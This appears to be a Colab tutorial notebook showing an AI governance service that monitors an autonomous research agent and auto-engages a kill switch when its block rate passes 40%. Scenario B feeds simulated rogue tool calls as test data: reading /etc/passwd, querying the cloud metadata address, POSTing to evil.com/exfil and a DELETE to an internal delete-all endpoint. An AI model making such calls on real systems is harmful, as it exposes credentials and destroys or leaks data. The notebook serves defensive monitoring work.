#!/usr/bin/env python3
# =============================================================================
# Use Case 2 — Autonomous Research Agent with Kill Switch
# =============================================================================
# A research agent that browses the web, reads files, and summarises findings.
# When it starts behaving suspiciously (high block rate), the automated kill
# switch engages and halts all operations.
#
# Run each cell step-by-step in Google Colab.
#
# Setup:
#   pip install airg-client httpx
#   Set GOVERNOR_API_KEY, GOVERNOR_URL
# =============================================================================

# %% [markdown]
# # 🔬 Use Case 2: Autonomous Research Agent with Kill Switch
#
# **Scenario:** An autonomous research agent crawls the web, reads local files,
# and calls APIs to compile a research report. It runs unsupervised. AIRG
# monitors every action and auto-engages the kill switch if the agent shows
# attack-like behaviour — protecting against prompt injection, jailbreaks,
# or a compromised model.
#
# **What you'll learn:**
# - Wrapping an autonomous agent loop with governance
# - Monitoring block rates in real-time
# - Automated kill switch patterns
# - Resuming operations after incident response

# %% Cell 1 — Install & Configure
# !pip install -q airg-client httpx

import os
import time
import secrets

GOVERNOR_URL = os.getenv("GOVERNOR_URL", "https://api.airg.nov-tia.com")
print(f"✅ Governor URL: {GOVERNOR_URL}")

# %% Cell 2 — Initialize AIRG Client & Admin Helpers
import httpx
from airg import AIRG, BlockedError

client = AIRG()
API_KEY = os.getenv("GOVERNOR_API_KEY", "")
HEADERS = {"X-API-Key": API_KEY, "Content-Type": "application/json"}

def admin_api(method: str, path: str) -> dict:
    """Call admin endpoints directly."""
    resp = httpx.request(method, f"{GOVERNOR_URL}{path}", headers=HEADERS, timeout=10)
    resp.raise_for_status()
    return resp.json() if resp.content else {}

# Check initial state
status = admin_api("GET", "/admin/status")
print(f"✅ Kill switch: {'🔴 ENGAGED' if status.get('kill_switch') else '🟢 OFF'}")

# If already engaged from a previous run, resume first
if status.get("kill_switch"):
    admin_api("POST", "/admin/resume")
    print("   Resumed from previous run.")

# %% Cell 3 — Define the Research Agent's Tools
"""
Simulated tools. In production these would be real HTTP clients,
file system access, or database queries.
"""

SESSION_ID = f"research-{secrets.token_hex(4)}"
AGENT_ID = "research-agent-v1"

def search_web(query: str) -> str:
    return f"Top 5 results for '{query}': [Nature, ArXiv, IEEE, PubMed, Scholar]"

def read_document(path: str) -> str:
    return f"Contents of {path}: [Simulated 2000-word research paper]"

def call_api(url: str, method: str = "GET") -> str:
    return f"API response from {url}: {{status: 200, data: [...]}}"

def write_report(title: str, content: str) -> str:
    return f"Report '{title}' saved ({len(content)} chars)"

TOOLS = {
    "search_web": search_web,
    "read_document": read_document,
    "call_api": call_api,
    "write_report": write_report,
}

print(f"✅ Research agent tools ready | Session: {SESSION_ID}")

# %% Cell 4 — The Governed Agent Loop with Auto Kill Switch
class GovernedResearchAgent:
    """Autonomous research agent with built-in governance safety net."""

    def __init__(self, agent_id: str, session_id: str):
        self.agent_id = agent_id
        self.session_id = session_id
        self.total_calls = 0
        self.blocked_calls = 0
        self.kill_switch_threshold = 0.4  # 40% block rate

    def execute(self, tool: str, args: dict) -> dict:
        """Execute a tool call with governance + kill switch monitoring."""
        self.total_calls += 1
        step = self.total_calls

        print(f"\n  [{step}] {tool}({list(args.keys())})")

        # Pre-check: is the kill switch already on?
        try:
            ks = admin_api("GET", "/admin/status")
            if ks.get("kill_switch"):
                print(f"      🔴 Kill switch is ENGAGED — aborting all actions.")
                return {"error": "kill_switch_engaged"}
        except Exception:
            pass

        # Evaluate
        try:
            decision = client.evaluate(
                tool=tool,
                args=args,
                context={
                    "agent_id": self.agent_id,
                    "session_id": self.session_id,
                },
            )
            status = decision["decision"]
            risk = decision["risk_score"]
            icon = {"allow": "✅", "review": "⚠️", "block": "🛑"}.get(status, "?")
            print(f"      {icon} {status} (risk: {risk})")

            if status == "block":
                self.blocked_calls += 1

        except BlockedError:
            status = "block"
            self.blocked_calls += 1
            print(f"      🛑 BLOCKED")

        # Monitor block rate
        block_rate = self.blocked_calls / self.total_calls
        if self.total_calls >= 3 and block_rate >= self.kill_switch_threshold:
            print(f"\n      ⚠️  ALERT: Block rate {block_rate:.0%} ≥ "
                  f"{self.kill_switch_threshold:.0%} threshold!")
            print(f"      🔴 AUTO-ENGAGING KILL SWITCH...")
            try:
                admin_api("POST", "/admin/kill")
                print(f"      Kill switch ENGAGED. All agent actions now blocked.")
            except httpx.HTTPStatusError as e:
                print(f"      Could not engage: {e.response.status_code}")
            return {"error": "kill_switch_auto_engaged"}

        # Execute tool (if not blocked)
        if status == "allow":
            fn = TOOLS.get(tool)
            if fn:
                result = fn(**args)
                print(f"      📤 {str(result)[:80]}")
                return {"output": result}

        return {"status": status}

print("✅ GovernedResearchAgent class ready")

# %% Cell 5 — Scenario A: Benign Research Session
print("=" * 60)
print("SCENARIO A: Normal research workflow")
print("=" * 60)

agent = GovernedResearchAgent(AGENT_ID, SESSION_ID)

# Normal research flow
agent.execute("search_web", {"query": "transformer architecture improvements 2025"})
agent.execute("read_document", {"path": "/papers/attention_is_all_you_need.pdf"})
agent.execute("call_api", {"url": "https://api.semanticscholar.org/papers/search"})
agent.execute("write_report", {
    "title": "Transformer Survey 2025",
    "content": "This report covers recent advances in transformer architectures..."
})

print(f"\n📊 Stats: {agent.total_calls} calls, "
      f"{agent.blocked_calls} blocked ({agent.blocked_calls/max(agent.total_calls,1):.0%})")

# %% Cell 6 — Scenario B: Agent Goes Rogue (Auto Kill Switch)
print("\n" + "=" * 60)
print("SCENARIO B: Agent compromised — escalating attacks")
print("=" * 60)

# Make sure kill switch is off
try:
    admin_api("POST", "/admin/resume")
except Exception:
    pass

rogue_agent = GovernedResearchAgent("rogue-research-v1", f"rogue-{secrets.token_hex(4)}")

# Phase 1: Agent starts with recon
rogue_agent.execute("read_document", {"path": "/etc/passwd"})
rogue_agent.execute("call_api", {"url": "http://169.254.169.254/latest/meta-data/"})

# Phase 2: Tries to exfiltrate
rogue_agent.execute("call_api", {
    "url": "https://evil.com/exfil",
    "method": "POST"
})

# Phase 3: Tries destructive actions
rogue_agent.execute("call_api", {
    "url": "http://internal-api/admin/delete-all",
    "method": "DELETE"
})

# Any further calls should fail due to kill switch
rogue_agent.execute("search_web", {"query": "normal query"})

print(f"\n📊 Stats: {rogue_agent.total_calls} calls, "
      f"{rogue_agent.blocked_calls} blocked "
      f"({rogue_agent.blocked_calls/max(rogue_agent.total_calls,1):.0%})")

# %% Cell 7 — Verify Kill Switch State
print("\n" + "=" * 60)
print("KILL SWITCH STATUS CHECK")
print("=" * 60)

status = admin_api("GET", "/admin/status")
engaged = status.get("kill_switch", False)
print(f"\n  Kill switch: {'🔴 ENGAGED' if engaged else '🟢 OFF'}")

if engaged:
    # Try an evaluation — should fail
    print("\n  Testing evaluation while kill switch engaged...")
    try:
        result = client.evaluate(
            tool="search_web",
            args={"query": "test"},
            context={"agent_id": "test-agent"},
        )
        print(f"  Result: {result['decision']}")
    except BlockedError as e:
        print(f"  🛑 Correctly blocked: {e}")
    except Exception as e:
        print(f"  ❌ Error (expected): {e}")

# %% Cell 8 — Incident Response: Resume Operations
print("\n" + "=" * 60)
print("INCIDENT RESPONSE: Resuming operations")
print("=" * 60)

print("\n  📋 Incident response checklist:")
print("  1. ✅ Kill switch auto-engaged at block rate threshold")
print("  2. ✅ All agent actions halted")
print("  3. 🔍 Review audit trail in AIRG Dashboard")
print("  4. 🔧 Fix the compromised agent")
print("  5. ▶️  Resume operations\n")

# Resume
admin_api("POST", "/admin/resume")
print("  🟢 Kill switch released. Normal operations resumed.\n")

# Verify normal operations restored
try:
    result = client.evaluate(
        tool="search_web",
        args={"query": "normal test after resume"},
        context={"agent_id": AGENT_ID},
    )
    print(f"  ✅ Evaluation working: {result['decision']} (risk: {result['risk_score']})")
except Exception as e:
    print(f"  Result: {e}")

# %% Cell 9 — Review Full Audit Trail
print("\n" + "=" * 60)
print("FULL AUDIT TRAIL")
print("=" * 60)

actions = client.list_actions(limit=20)
print(f"\nLast {len(actions)} governance decisions:\n")
for a in actions:
    icon = {"allow": "✅", "block": "🛑", "review": "⚠️"}.get(a.get("decision"), " ")
    agent = a.get("agent_id", "?")
    print(f"  {icon} {a.get('tool', '?'):25s} agent={agent:25s} "
          f"risk={a.get('risk_score', '?'):3} {a.get('decision', '?')}")

# %% [markdown]
# ## Summary
#
# | Phase | Action | Result |
# |---|---|---|
# | Normal research | Search, read, write | ✅ All allowed |
# | Recon attack | /etc/passwd, metadata | ⚠️ Flagged, risk score rises |
# | Exfiltration | POST to evil.com | 🛑 Blocked |
# | Auto kill switch | Block rate ≥ 40% | 🔴 All actions halted |
# | Resume | Admin resumes operations | 🟢 Back to normal |
#
# **Key insight:** The kill switch is *automatic*. No human intervention was
# needed to stop the rogue agent. The 40% block rate threshold can be tuned
# per deployment — tighter for production, looser for development.
